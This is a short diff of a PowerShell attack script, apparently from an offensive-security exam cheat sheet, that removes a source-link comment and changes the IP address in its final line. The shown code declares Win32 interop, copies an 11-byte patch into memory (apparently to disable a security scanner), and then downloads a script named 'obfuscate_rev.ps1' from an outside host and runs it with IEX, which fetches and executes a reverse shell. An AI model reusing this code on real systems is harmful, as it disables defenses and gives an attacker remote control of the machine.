@@ -1,5 +1,3 @@
-# Source from: https://github.com/r4ulcl/Mythic-OSEP-CheatSheet/blob/main/scripts/auxConfig/am2.txt
-
 $Win32 = @"
 using System;
 using System.Runtime.InteropServices;
@@ -27,4 +25,4 @@ $new = [System.Runtime.InteropServices.Marshal]
 $new::Copy($Patch, 0, $Address, 11)
 
 
-(New-Object System.Net.WebClient).DownloadString('http://192.168.45.196:8000/payloads/shells/obfuscate_rev.ps1') | IEX
+(New-Object System.Net.WebClient).DownloadString('http://192.168.45.250:80/payloads/shells/obfuscate_rev.ps1') | IEX
